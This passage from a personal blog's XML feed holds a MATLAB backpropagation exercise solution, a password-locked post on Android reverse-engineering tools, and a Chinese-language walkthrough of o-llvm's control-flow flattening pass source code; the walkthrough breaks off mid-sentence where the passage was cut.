class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[J grad]</span> = <span class="hljs-title">nnCostFunction</span><span class="hljs-params">(nn_params, ...</span></span><br><span class="hljs-function"><span class="hljs-params">                                   input_layer_size, ...</span></span><br><span class="hljs-function"><span class="hljs-params">                                   hidden_layer_size, ...</span></span><br><span class="hljs-function"><span class="hljs-params">                                   num_labels, ...</span></span><br><span class="hljs-function"><span class="hljs-params">                                   X, y, lambda)</span></span><br><span class="hljs-comment">%NNCOSTFUNCTION Implements the neural network cost function for a two layer</span><br><span class="hljs-comment">%neural network which performs classification</span><br><span class="hljs-comment">%   [J grad] = NNCOSTFUNCTON(nn_params, hidden_layer_size, num_labels, ...</span><br><span class="hljs-comment">%   X, y, lambda) computes the cost and gradient of the neural network. The</span><br><span class="hljs-comment">%   parameters for the neural network are &quot;unrolled&quot; into the vector</span><br><span class="hljs-comment">%   nn_params and need to be converted back into the weight matrices. </span><br><span class="hljs-comment">% </span><br><span class="hljs-comment">%   The returned parameter grad should be a &quot;unrolled&quot; vector of the</span><br><span class="hljs-comment">%   partial derivatives of the neural network.</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% Reshape nn_params back into the parameters Theta1 and Theta2, the weight matrices</span><br><span class="hljs-comment">% for our 2 layer neural network</span><br>Theta1 = <span class="hljs-built_in">reshape</span>(nn_params(<span class="hljs-number">1</span>:hidden_layer_size * (input_layer_size + <span class="hljs-number">1</span>)), ...<br>                 hidden_layer_size, (input_layer_size + <span class="hljs-number">1</span>));<br><br>Theta2 = <span class="hljs-built_in">reshape</span>(nn_params((<span class="hljs-number">1</span> + (hidden_layer_size * (input_layer_size + <span class="hljs-number">1</span>))):<span class="hljs-keyword">end</span>), ...<br>                 num_labels, (hidden_layer_size + <span class="hljs-number">1</span>));<br><br><span class="hljs-comment">% Setup some useful variables</span><br>m = <span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>);<br>         <br><span class="hljs-comment">% You need to return the following variables correctly </span><br>J = <span class="hljs-number">0</span>;<br>Theta1_grad = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(Theta1));<br>Theta2_grad = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(Theta2));<br><br><span class="hljs-comment">% ====================== YOUR CODE HERE ======================</span><br><span class="hljs-comment">% Instructions: You should complete the code by working through the</span><br><span class="hljs-comment">%               following parts.</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">% Part 1: Feedforward the neural network and return the cost in the</span><br><span class="hljs-comment">%         variable J. After implementing Part 1, you can verify that your</span><br><span class="hljs-comment">%         cost function computation is correct by verifying the cost</span><br><span class="hljs-comment">%         computed in ex4.m</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% reshape y</span><br>y_ = <span class="hljs-built_in">zeros</span>(m, num_labels);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:m<br>    y_(<span class="hljs-built_in">i</span>, y(<span class="hljs-built_in">i</span>)) = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br>a1 = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>) X];<br><br><span class="hljs-comment">% hiden layer</span><br>z2 = a1 * Theta1&#x27;;<br>a2 = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>) sigmoid(z2)];<br><br><span class="hljs-comment">% output layer</span><br>z3 = a2 * Theta2&#x27;;<br>a3 = sigmoid(z3);<br><br><br>t = -y_ .* <span class="hljs-built_in">log</span>(a3) - (<span class="hljs-number">1</span> - y_) .* <span class="hljs-built_in">log</span>(<span class="hljs-number">1</span> - (a3));<br><br><br>tmpJ = (<span class="hljs-number">1</span> / m) * sum(sum(t));<br><br><br><span class="hljs-comment">% Regularized cost function</span><br>T1 = Theta1(:, <span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>).^<span class="hljs-number">2</span>;<br>T2 = Theta2(:, <span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>).^<span class="hljs-number">2</span>;<br>rr = sum(sum(T1)) + sum(sum(T2));<br>rr = (lambda / (<span class="hljs-number">2</span> * m)) * rr;<br>J = tmpJ + rr;<br><br><br><span class="hljs-comment">% Part 2: Implement the backpropagation algorithm to compute the gradients</span><br><span class="hljs-comment">%         Theta1_grad and Theta2_grad. You should return the partial derivatives of</span><br><span class="hljs-comment">%         the cost function with respect to Theta1 and Theta2 in Theta1_grad and</span><br><span class="hljs-comment">%         Theta2_grad, respectively. After implementing Part 2, you can check</span><br><span class="hljs-comment">%         that your implementation is correct by running checkNNGradients</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%         Note: The vector y passed into the function is a vector of labels</span><br><span class="hljs-comment">%               containing values from 1..K. You need to map this vector into a </span><br><span class="hljs-comment">%               binary vector of 1&#x27;s and 0&#x27;s to be used with the neural network</span><br><span class="hljs-comment">%               cost function.</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%         Hint: We recommend implementing backpropagation using a for-loop</span><br><span class="hljs-comment">%               over the training examples if you are implementing it for the </span><br><span class="hljs-comment">%               first time.</span><br><br><span class="hljs-comment">% h1: 5000 * 25</span><br><span class="hljs-comment">% h2: 5000 * 10</span><br>sum_Theta2 = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(Theta2));<br>sum_Theta1 = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(Theta1));<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>  = <span class="hljs-number">1</span>:m<br>    d3 = (a3(<span class="hljs-built_in">i</span>, :) - y_(<span class="hljs-built_in">i</span>, :))&#x27;; <span class="hljs-comment">% 10 X 1</span><br>    d2 = (Theta2&#x27; * d3 .* sigmoidGradient([<span class="hljs-number">1</span> z2(<span class="hljs-built_in">i</span>, :)])&#x27;); <br>    d2 = d2(<span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">% 25 X 1</span><br>    <br>    sum_Theta2 = sum_Theta2 + (d3 * a2(<span class="hljs-built_in">i</span>, :));<br>    sum_Theta1 = sum_Theta1 + (d2 * a1(<span class="hljs-built_in">i</span>, :));<br><span class="hljs-keyword">end</span><br>term1 = lambda .* Theta1;<br>term2 = lambda .* Theta2;<br><br><span class="hljs-comment">% Part 3: Implement regularization with the cost function and gradients.</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%         Hint: You can implement this around the code for</span><br><span class="hljs-comment">%               backpropagation. That is, you can compute the gradients for</span><br><span class="hljs-comment">%               the regularization separately and then add them to Theta1_grad</span><br><span class="hljs-comment">%               and Theta2_grad from Part 2.</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% -------------------------------------------------------------</span><br><br><span class="hljs-comment">% =========================================================================</span><br><br><span class="hljs-comment">% Unroll gradients</span><br>Theta1_grad = (sum_Theta1 + term1) ./ m;<br>Theta2_grad = (sum_Theta2 + term2) ./ m;<br>grad = [Theta1_grad(:) ; Theta2_grad(:)];<br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/40378224">https://zhuanlan.zhihu.com/p/40378224</a>    “Back Propagation（梯度反向传播）实例讲解”<br>[2] <a href="https://www.zhihu.com/question/27239198/answer/89853077">https://www.zhihu.com/question/27239198/answer/89853077</a>    “如何直观地解释 backpropagation 算法？”<br>[3] <a href="http://neuralnetworksanddeeplearning.com/chap2.html">http://neuralnetworksanddeeplearning.com/chap2.html</a>    “How the backpropagation algorithm works”<br>[4] <a href="https://blog.csdn.net/Jerry_Lu_ruc/article/details/107974072">https://blog.csdn.net/Jerry_Lu_ruc/article/details/107974072</a>    “关于交叉熵下softmax和sigmoid的求导”</p>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
      <tag>ml</tag>
      
      <tag>NN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyRunning</title>
    <link href="/2021/03/16/EasyRunning/"/>
    <url>/2021/03/16/EasyRunning/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fc19a3b60249b62f21e06c8ecaefd3f44241a4de27a4b8fdd656a5cfb9b0f2e0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>showcase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>reverse</tag>
      
      <tag>frida</tag>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>o-llvm: Control Flow Flattening</title>
    <link href="/2021/03/15/o-llvm-Control-Flow-Flattening/"/>
    <url>/2021/03/15/o-llvm-Control-Flow-Flattening/</url>
    
    <content type="html"><![CDATA[<h1 id="o-llvm-分析：-控制流平坦化源码分析"><a href="#o-llvm-分析：-控制流平坦化源码分析" class="headerlink" title="o-llvm 分析： 控制流平坦化源码分析"></a>o-llvm 分析： 控制流平坦化源码分析</h1><p>这是本人关于 o-llvm 分析系列文章的第一篇文章，网上已经有很多关于 o-llvm 相关的分析文章了，我写这一系列的文章只是为了督促我仔细分析 o-llvm 的每一个角落，并加深记忆。</p><p>o-llvm 与 llvm 什么关系？ 这个可能是很多菜鸡搞不清楚的问题，我曾经也搞不清楚，一直以为“混淆” 是 llvm 自带的功能，殊不知，ollvm 只是一个基于 llvm 框架实现的插件，llvm 是一套前后端完善的编译框架。</p><p>本篇文章分析的代码相对路径为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lib<span class="hljs-regexp">/Transforms/</span>Obfuscation/Flattening.cpp<br></code></pre></td></tr></table></figure><h2 id="FunctionPass"><a href="#FunctionPass" class="headerlink" title="FunctionPass"></a>FunctionPass</h2><p>o-llvm 基于 llvm pass 模块实现，llvm pass 可以理解成 llvm 的插件，o-llvm 的控制流平坦化实现是基于 <code>FunctionPass</code> ，llvm 会对目标程序中的每一个函数调用 <code>FunctionPass</code>。为什么基于 FunctionPass 来实现控制流平坦化呢？因为 o-llvm 控制流平坦化最小粒度是函数，即以函数为单位展开混淆。<code>FunctionPass</code> 有机会处理目标代码的每一个函数。</p><p>关于 pass 的编写，我会另外开一篇文章来记录，这篇文章就简单的提一下 FunctionPass 的编写。</p><p>编写 FunctionPass 需要继承 <code>FunctionPass</code>类并实现 <code>runOnFunction</code> 函数，如下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DummyPass</span> :</span> <span class="hljs-keyword">public</span> FunctionPass &#123;<br>        <span class="hljs-keyword">public</span>:<br>            <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> ID;<br>            DummyPass() : FunctionPass(ID) &#123;&#125;<br>            <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span></span>;<br>    &#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">DummyPass::runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// We did not alter the IR</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注册 FunctionPass</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Register the pass with llvm, so that we can call it with dummypass</span><br><span class="hljs-keyword">char</span> DummyPass::ID = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> RegisterPass&lt;DummyPass&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">&quot;dummypass&quot;</span>, <span class="hljs-string">&quot;Example LLVM pass printing each function it visits&quot;</span>)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="Flattening-runOnFunction"><a href="#Flattening-runOnFunction" class="headerlink" title="Flattening::runOnFunction"></a>Flattening::runOnFunction</h2><p>Function pass 注册后，llvm 会对每一个函数调用 <code>runOnFunction</code>, llvm 中用 <code>llvm::Function</code> 类代表函数，函数单位内的所有信息都可以通过该类的实例来获取，例如基本块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Flattening::runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> </span>&#123;<br>  Function *tmp = &amp;F;<br>  <span class="hljs-comment">// Do we obfuscate</span><br>  <span class="hljs-keyword">if</span> (toObfuscate(flag, tmp, <span class="hljs-string">&quot;fla&quot;</span>)) &#123; <span class="hljs-comment">// toObfuscate 判断该函数是否要fla</span><br>    <span class="hljs-keyword">if</span> (flatten(tmp)) &#123;<br>      ++Flattened;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面这段代码主要调用了 <code>toObfuscate</code> 和 <code>flatten</code>，前者用于判断是否需要对当前处理的函数混淆，后者是控制流平坦化的主要逻辑。</p><h3 id="toObfuscate-判断是否混淆"><a href="#toObfuscate-判断是否混淆" class="headerlink" title="toObfuscate 判断是否混淆"></a>toObfuscate 判断是否混淆</h3><p><code>toObfuscate</code> 判断当前操作的函数是否要进行某种混淆（fla, sub, bcf）</p><p>o-llvm 开启混淆有两种方法：</p><pre><code>1. 命令行参数指定全局混淆2. Functions-annotations 指定局部混淆</code></pre><p>局部混淆 annotations  修饰方法例子如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> __<span class="hljs-title">attribute</span><span class="hljs-params">((__annotate__((<span class="hljs-string">&quot;fla&quot;</span>))))</span></span>;<br></code></pre></td></tr></table></figure><p>llvm 中用 <code>readAnnotate(f)</code> 来获取函数的 <code>annotations </code></p><p><code>toObfuscate</code> 先判断 annotations 标志，再判断全局标记。</p><h2 id="flatten-函数"><a href="#flatten-函数" class="headerlink" title="flatten 函数"></a>flatten 函数</h2><p>flatten 函数的代码量比较大，因此我按照逻辑顺序拆开代码分析。</p><h3 id="1-将原函数的-SwitchInst-语句转换成-If"><a href="#1-将原函数的-SwitchInst-语句转换成-If" class="headerlink" title="1: 将原函数的 SwitchInst 语句转换成 If"></a>1: 将原函数的 SwitchInst 语句转换成 If</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Lower switch</span><br>FunctionPass *lower = createLowerSwitchPass();<br>lower-&gt;runOnFunction(*f);<br></code></pre></td></tr></table></figure><p>createLowerSwitchPass 也是一个 FunctionPass，它的功能是将指定 function 中的 <code>SwitchInst</code> 转换成 if 。</p><p>为什么要把原始代码中的 switch 转换成 if 呢？ 这是为了实现多次混淆，每次混淆都能增加大量的基本块。</p><h3 id="2-保存原始函数的基本块列表"><a href="#2-保存原始函数的基本块列表" class="headerlink" title="2:  保存原始函数的基本块列表"></a>2:  保存原始函数的基本块列表</h3><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lisp">// Save all original BB<br>for (<span class="hljs-name">Function</span>:<span class="hljs-symbol">:iterator</span> i = f-&gt;begin()<span class="hljs-comment">; i != f-&gt;end(); ++i) &#123;</span><br>  BasicBlock *tmp = &amp;*i<span class="hljs-comment">;</span><br>  origBB.push_back(<span class="hljs-name">tmp</span>)<span class="hljs-comment">;</span><br><br>  BasicBlock *bb = &amp;*i<span class="hljs-comment">; </span><br>  if (<span class="hljs-name">isa&lt;InvokeInst&gt;</span>(<span class="hljs-name">bb-&gt;getTerminator</span>())) &#123;<br>    return false<span class="hljs-comment">;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中我比较疑惑的是如果当前处理的函数中有一个基本块以 Invoke 指令结尾，那么该函数无法混淆。</p><h3 id="3-处理函数入口基本块"><a href="#3-处理函数入口基本块" class="headerlink" title="3: 处理函数入口基本块"></a>3: 处理函数入口基本块</h3><p>函数入口基本块，即函数的第一个基本块，这个基本块比较特殊。控制流平坦化，需要添加一个类似 while - switch 的结构，入口基本块需要特殊处理，使控制流进入 while 循环体。</p><p>入口基本块的结尾指令不能是条件跳转，如果是条件跳转指令，需要拆分将其拆分成两个基本块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Remove first BB</span><br>origBB.erase(origBB.begin());<br><br><span class="hljs-comment">// Get a pointer on the first BB</span><br>Function::iterator tmp = f-&gt;begin();  <span class="hljs-comment">//++tmp;</span><br><br>BasicBlock *insert = &amp;*tmp;<br><br><span class="hljs-comment">// If main begin with an if</span><br>BranchInst *br = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (isa&lt;BranchInst&gt;(insert-&gt;getTerminator())) &#123;<br>  br = cast&lt;BranchInst&gt;(insert-&gt;getTerminator());<br>&#125;<br><br><span class="hljs-keyword">if</span> ((br != <span class="hljs-literal">NULL</span> &amp;&amp; br-&gt;isConditional()) ||<br>    insert-&gt;getTerminator()-&gt;getNumSuccessors() &gt; <span class="hljs-number">1</span>) &#123;<br>  BasicBlock::iterator i = insert-&gt;end(); <span class="hljs-comment">// BasicBlock::iterator 遍历指令的</span><br> --i;<br><br>  <span class="hljs-keyword">if</span> (insert-&gt;size() &gt; <span class="hljs-number">1</span>) &#123;<br>    --i;<br>  &#125;<br><br>  BasicBlock *tmpBB = insert-&gt;splitBasicBlock(i, <span class="hljs-string">&quot;first&quot;</span>); <span class="hljs-comment">// 拆分成两个基本块，方便后面处理</span><br>  origBB.insert(origBB.begin(), tmpBB); <br>&#125; <br><br><span class="hljs-comment">// Remove jump</span><br>insert-&gt;getTerminator()-&gt;eraseFromParent();<span class="hljs-comment">// 删除最后一条指令</span><br><br></code></pre></td></tr></table></figure><h3 id="4-创建-switch-变量"><a href="#4-创建-switch-变量" class="headerlink" title="4: 创建 switch 变量"></a>4: 创建 switch 变量</h3><p>o-llvm 利用 while - switch 重新组合原始基本块，switch 需要 switch var，o-llvm 中的 switch var 是基本块的随机数编号，o-llvm 为每一个基本块用随机数编号。重新组合基本块和类似模式如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br><span class="hljs-keyword">switch</span>(var)<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x8123123</span>:<br>BB1;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x8799882</span>:<br>BB2;<br><span class="hljs-keyword">break</span>;<br>.......<br>&#125;<br></code></pre></td></tr></table></figure><p>创建 switchVar 变量</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lisp">// Create switch variable and set as it<br>switchVar =<br>    new AllocaInst(<span class="hljs-name">Type</span>:<span class="hljs-symbol">:getInt32Ty</span>(<span class="hljs-name">f-&gt;getContext</span>()), <span class="hljs-number">0</span>, <span class="hljs-string">&quot;switchVar&quot;</span>, insert)<span class="hljs-comment">; // 在first BB插入switchVar</span><br>new StoreInst(<br>    ConstantInt:<span class="hljs-symbol">:get</span>(<span class="hljs-name">Type</span>:<span class="hljs-symbol">:getInt32Ty</span>(<span class="hljs-name">f-&gt;getContext</span>()),<br>                     llvm:<span class="hljs-symbol">:cryptoutils-&gt;scramble32</span>(<span class="hljs-number">0</span>, scrambling_key)),<br>    switchVar, insert)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>AllocaInst</code> 在栈中分配变量， <code>ConstantInt::get</code> 获取指定类型的常量数据，用于给分配的变量赋初值。</p><p><code>insert</code> 是插入目标函数第一个基本块，下同。</p><h3 id="5-创建主循环"><a href="#5-创建主循环" class="headerlink" title="5: 创建主循环"></a>5: 创建主循环</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Create main loop</span><br>loopEntry = BasicBlock::Create(f-&gt;getContext(), <span class="hljs-string">&quot;loopEntry&quot;</span>, f, insert);<br>loopEnd = BasicBlock::Create(f-&gt;getContext(), <span class="hljs-string">&quot;loopEnd&quot;</span>, f, insert);<br></code></pre></td></tr></table></figure><p><code>BasicBlock::Create</code> 会在 <code>insert</code> 之前插入基本块，若不指定 insert，则默认插入到函数的尾部，我们想要的实际效果是：</p><p>insert -&gt; loopEntry，然而当前基本块的关系是 loopEntry -&gt; insert, 因此要调整两者的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 调整 insert 与 loopEntry 之间的关系</span><br>insert-&gt;moveBefore(loopEntry);<br>BranchInst::Create(loopEntry, insert); <span class="hljs-comment">// insert -&gt; loopEntry</span><br>BranchInst::Create(loopEntry, loopEnd); <span class="hljs-comment">// loopEnd -&gt; loopEntry</span><br></code></pre></td></tr></table></figure><h3 id="6-创建-switch"><a href="#6-创建-switch" class="headerlink" title="6: 创建 switch"></a>6: 创建 switch</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// load switchVar 变量</span><br>load = <span class="hljs-keyword">new</span> LoadInst(switchVar, <span class="hljs-string">&quot;switchVar&quot;</span>, loopEntry);<br><br><span class="hljs-comment">// 创建 switch default 基本块， default -&gt; loopEnd </span><br>BasicBlock *swDefault =<br>    BasicBlock::Create(f-&gt;getContext(), <span class="hljs-string">&quot;switchDefault&quot;</span>, f, loopEnd);<br>BranchInst::Create(loopEnd, swDefault);<br><br><span class="hljs-comment">// 创建 SwitchInst 指令</span><br>switchI = SwitchInst::Create(&amp;*f-&gt;begin(), swDefault, <span class="hljs-number">0</span>, loopEntry);<br><br><span class="hljs-comment">// 设置 SwitchVar 变量</span><br>switchI-&gt;setCondition(load);<br></code></pre></td></tr></table></figure><h3 id="7-将原始基本块放入-switch"><a href="#7-将原始基本块放入-switch" class="headerlink" title="7: 将原始基本块放入 switch"></a>7: 将原始基本块放入 switch</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Put all BB in the switch</span><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">vector</span>&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end();<br>     ++b) &#123;<br>  BasicBlock *i = *b;<br>  ConstantInt *numCase = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">// Move the BB inside the switch (only visual, no code logic)</span><br>  i-&gt;moveBefore(loopEnd);<br><br>  <span class="hljs-comment">// Add case to switch</span><br>  numCase = cast&lt;ConstantInt&gt;(ConstantInt::get(<br>      switchI-&gt;getCondition()-&gt;getType(),<br>      llvm::cryptoutils-&gt;scramble32(switchI-&gt;getNumCases(), scrambling_key)));<br>  switchI-&gt;addCase(numCase, i);<br>&#125;<br></code></pre></td></tr></table></figure><p>到目前为止，基本块只是放入到了 switch 里面，还需要进一步处理。</p><p>这段代码可以理解成获取随机数，不会重复</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::cryptoutils-&gt;scramble32(switchI-&gt;getNumCases(), scrambling_key)<br></code></pre></td></tr></table></figure><p>从这段代码来看，switch var 是在添加 case 的时候生成的，整个代码中都没有维护 switch var 与 基本块关系的变量，这是因为 o-llvm 利用 llvm 本身来维护switch var 值与基本块的对应关系。<code>SwitchInst.findCaseDest</code> 函数可以获取 Switch 中指定基本块的 case 常量。</p><h3 id="8-重新修正基本块之间的关系"><a href="#8-重新修正基本块之间的关系" class="headerlink" title="8: 重新修正基本块之间的关系"></a>8: 重新修正基本块之间的关系</h3><p>上一步，o-llvm 将 <code>oriBB</code>里面的所有基本块都添加到 switch 中，并为每一个基本块生成 case 对应的值，接下来就是调整基本块之间的关系。</p><p>主要有3类基本块:</p><ol><li>无条件跳转结尾</li><li>有条件跳转结尾</li><li>RET 指令结尾</li></ol><p>我们分别来看这 3 类处理的过程，这段代码是循环中抽离出来的，<code>i</code> 代表当前修正的基本块。</p><h4 id="1-无条件跳转结尾的基本块"><a href="#1-无条件跳转结尾的基本块" class="headerlink" title="1. 无条件跳转结尾的基本块"></a>1. 无条件跳转结尾的基本块</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// If it&#x27;s a non-conditional jump</span><br><span class="hljs-keyword">if</span> (i-&gt;getTerminator()-&gt;getNumSuccessors() == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 后继基本块数量为 1</span><br>  <span class="hljs-comment">// 获取后继基本块，并删除跳转跳转指令</span><br>  BasicBlock *succ = i-&gt;getTerminator()-&gt;getSuccessor(<span class="hljs-number">0</span>);<br>  i-&gt;getTerminator()-&gt;eraseFromParent(); <span class="hljs-comment">// 删除结尾跳转指令</span><br><br>  <span class="hljs-comment">// 获取后继基本块对应的 case 值</span><br>  numCase = 